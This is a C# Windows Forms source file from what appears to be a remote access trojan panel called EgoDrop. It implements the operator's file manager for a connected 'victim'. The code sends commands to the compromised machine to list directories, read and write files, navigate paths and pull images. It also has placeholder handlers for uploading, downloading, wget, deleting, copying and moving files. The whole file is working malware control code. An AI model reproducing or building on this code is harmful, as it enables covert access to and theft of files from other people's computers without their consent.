using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmFileMgr : Form
    {
        public clsVictim m_victim { get; set; }

        private string m_szInitDir { get; set; }
        private struct stFileInfo
        {
            public bool bDirectory;
            public string szFilePath;
            public string szFileName { get { return szFilePath.Split('/').Last(); } }
            public ulong nFileSize;
            public string szPermission;

            public string szCreationDate;
            public string szLastModifiedDate;
            public string szLastAccessedDate;

            public stFileInfo(
                bool bDirectory,
                string szFilePath,
                ulong nFileSize,
                string szPermission,

                string szCreationDate,
                string szLastModifiedDate,
                string szLastAccessedDate
            )
            {
                this.bDirectory = bDirectory;
                this.szFilePath = szFilePath;
                this.nFileSize = nFileSize;
                this.szPermission = szPermission;

                this.szCreationDate = szCreationDate;
                this.szLastModifiedDate = szLastModifiedDate;
                this.szLastAccessedDate = szLastAccessedDate;
            }
        }

        public frmFileMgr(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szInitDir = string.Empty;
        }

        private void fnRecvMsg(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim))
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    if (lsMsg[0] == "file")
                    {
                        if (lsMsg[1] == "init")
                        {
                            textBox1.Text = lsMsg[2];
                            textBox1.Tag = lsMsg[2];
                            m_szInitDir = lsMsg[2];

                            TreeNode node = fnAddTreeNodeByPath(m_szInitDir);
                            treeView1.ExpandAll();
                            treeView1.SelectedNode = node;
                        }
                        else if (lsMsg[1] == "sd")
                        {
                            string szPath = lsMsg[2];
                            TreeNode tnNode = fnFindTreeNodeByPath(szPath, treeView1.Nodes);
                            if (tnNode == null)
                                return;

                            textBox1.Text = szPath;
                            textBox1.Tag = szPath;
                            listView1.Items.Clear();

                            List<List<string>> ls = clsEZData.fn2dLB64Decode(lsMsg[3]);
                            List<stFileInfo> lsFolder = new List<stFileInfo>();
                            List<stFileInfo> lsFile = new List<stFileInfo>();

                            foreach (var lFile in ls)
                            {
                                string szFilePath = lFile[1];
                                string szFileName = szFilePath.Split('/').Last();
                                if (string.IsNullOrEmpty(szFileName) || szFileName == "." || szFileName == "..")
                                    continue;

                                bool bDirectory = lFile[0] == "1";
                                ulong nFileSize = ulong.Parse(lFile[2]);
                                string szPermission = lFile[3];
                                string szCreationDate = lFile[4];
                                string szLastModifiedDate = lFile[5];
                                string szLastAccessedDate = lFile[6];

                                stFileInfo file = new stFileInfo(
                                    bDirectory,
                                    szFilePath,
                                    nFileSize,
                                    szPermission,
                                    szCreationDate,
                                    szLastModifiedDate,
                                    szLastModifiedDate
                                );

                                if (bDirectory)
                                    lsFolder.Add(file);
                                else
                                    lsFile.Add(file);
                            }

                            //Sorting.
                            lsFolder.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));
                            lsFile.Sort((a, b) => a.szFileName.CompareTo(b.szFileName));

                            List<stFileInfo> lFinal = lsFolder.Concat(lsFile).ToList();
                            foreach (var entry in lFinal)
                            {
                                ListViewItem item = new ListViewItem(entry.szFileName);
                                item.SubItems.Add(entry.nFileSize.ToString());
                                item.SubItems.Add(entry.szPermission);
                                item.SubItems.Add(entry.szCreationDate);
                                item.SubItems.Add(entry.szLastModifiedDate);
                                item.SubItems.Add(entry.szLastAccessedDate);

                                item.ImageIndex = entry.bDirectory ? 1 : 0;
                                item.Tag = entry;

                                listView1.Items.Add(item);

                                if (entry.bDirectory)
                                {
                                    fnAddTreeNodeByPath(entry.szFilePath);
                                }
                            }

                            tnNode.Expand();
                            tnNode.EnsureVisible();

                            listView1.Refresh();

                            toolStripStatusLabel1.Text = $"Folder[{lsFolder.Count}] File[{lsFile.Count}]";
                        }
                        else if (lsMsg[1] == "wf")
                        {

                        }
                        else if (lsMsg[1] == "rf")
                        {
                            frmFileEditor f = clsTools.fnFindForm<frmFileEditor>(victim);
                            if (f == null)
                            {
                                f = new frmFileEditor(victim);
                                f.Show();
                            }
                            else
                            {
                                f.BringToFront();
                            }

                            int nCode = int.Parse(lsMsg[2]);
                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox(lsMsg[4]);
                                return;
                            }

                            string szFilePath = lsMsg[3];
                            string szFileContent = lsMsg[4];

                            f.fnAddNewPage(szFilePath, szFileContent);
                        }
                        else if (lsMsg[1] == "goto")
                        {
                            int nCode = int.Parse(lsMsg[2]);
                            string szDirPath = lsMsg[3];

                            if (nCode == 0)
                            {
                                clsTools.fnShowErrMsgbox("Directory does not exist: " + szDirPath);
                                textBox1.Text = (string)textBox1.Tag;
                                textBox1.SelectionStart = textBox1.Text.Length;

                                return;
                            }

                            TreeNode tnNode = fnAddTreeNodeByPath(szDirPath);
                            treeView1.SelectedNode = tnNode;
                        }
                        else if (lsMsg[1] == "uf")
                        {

                        }
                        else if (lsMsg[1] == "df")
                        {

                        }
                        else if (lsMsg[1] == "wget")
                        {

                        }
                        else if (lsMsg[1] == "del")
                        {

                        }
                        else if (lsMsg[1] == "cp")
                        {

                        }
                        else if (lsMsg[1] == "mv")
                        {

                        }
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, "fileMgr", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }));
        }

        private stFileInfo fnGetInfoStruct(ListViewItem item) => (stFileInfo)item.Tag;

        private TreeNode fnFindTreeNodeByPath(string szPath, TreeNodeCollection treeNodeCollection, TreeNode node = null)
        {
            if (string.IsNullOrEmpty(szPath) || treeNodeCollection.Count == 0)
                return node;

            if (node == null)
                node = treeNodeCollection[0];

            string szNewPath = szPath.Trim('/');
            string[] split = szNewPath.Split('/');
            foreach (TreeNode tnNode in node.Nodes)
            {
                if (string.Equals(tnNode.Text, split.First()))
                {
                    return fnFindTreeNodeByPath(string.Join("/", split.Skip(1).ToArray()), tnNode.Nodes, tnNode);
                }
            }

            return node;
        }

        private TreeNode fnAddTreeNodeByPath(string szPath)
        {
            TreeNode fnRecursive(TreeNode node, string szRelativePath)
            {
                if (string.IsNullOrEmpty(szRelativePath))
                    return node;
                else
                {
                    if (string.IsNullOrEmpty(szRelativePath))
                        return node;

                    szRelativePath = szRelativePath.Trim('/');

                    TreeNode tnNode = null;
                    string[] split = szRelativePath.Split('/');

                    foreach (TreeNode t in node.Nodes)
                    {
                        if (string.Equals(t.Text, split.First()))
                        {
                            tnNode = t;
                            break;
                        }
                    }

                    if (tnNode == null)
                    {
                        tnNode = new TreeNode(split.First());

                        int nIdx = 0;
                        foreach (TreeNode t in node.Nodes)
                        {
                            if (string.Compare(tnNode.Text, t.Text) > 0)
                                nIdx++;
                        }

                        node.Nodes.Insert(nIdx, tnNode);

                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                    else
                    {
                        return fnRecursive(tnNode, string.Join("/", split.Skip(1).ToArray()));
                    }
                }
            }

            TreeNode tnRoot = null;
            if (treeView1.Nodes.Count == 0)
            {
                tnRoot = new TreeNode("/");
                treeView1.Nodes.Add(tnRoot);
            }
            else
            {
                tnRoot = treeView1.Nodes[0];
            }

            if (szPath == "/")
            {
                return tnRoot;
            }
            else
            {
                return fnRecursive(tnRoot, szPath);
            }
        }

        public void fnWriteFile(string szFilePath, string szContent)
        {
            m_victim.fnSendCommand(new string[]
            {
                "file",
                "wf",
                szFilePath,
                szContent,
            });
        }

        public void fnReadFile(string szFilePath)
        {
            m_victim.fnSendCommand(new string[]
            {
                "file",
                "rf",
                szFilePath,
            });
        }

        public void fnGoto(string szDirPath)
        {
            m_victim.fnSendCommand(new string[]
            {
                "file",
                "goto",
                szDirPath,
            });
        }

        private void fnSetup()
        {
            m_victim.fnSendCommand("file|init");
            m_victim.m_listener.evtReceivedMessage += fnRecvMsg;
        }

        private void frmFileMgr_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmFileMgr_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecvMsg;
        }

        private async void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            string szPath = treeView1.SelectedNode.FullPath.Replace("\\", "/").Replace("//", "/");
            m_victim.fnSendCommand("file|sd|" + szPath);
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
            if (item == null)
                return;

            stFileInfo info = fnGetInfoStruct(item);
            if (info.bDirectory)
            {
                TreeNode node = fnFindTreeNodeByPath(info.szFilePath, treeView1.Nodes);
                treeView1.SelectedNode = node;
            }
            else
            {
                fnReadFile(info.szFilePath);
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                string szDirPath = textBox1.Text;
                fnGoto(szDirPath);
            }
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.Items.Cast<ListViewItem>().ToList()
                .Select(x => fnGetInfoStruct(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
            if (f == null)
            {
                f = new frmFileImage(m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }

        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            List<string> lsImage = listView1.SelectedItems.Cast<ListViewItem>().ToList()
                .Select(x => fnGetInfoStruct(x))
                .Where(x => !x.bDirectory && clsTools.fnbIsImage(x.szFileName))
                .Select(x => x.szFilePath)
                .ToList();

            frmFileImage f = clsTools.fnFindForm<frmFileImage>(m_victim);
            if (f == null)
            {
                f = new frmFileImage(m_victim);
                f.Show();
            }
            else
            {
                f.BringToFront();
            }

            f.fnSendImageRequest(lsImage);
        }
    }
}
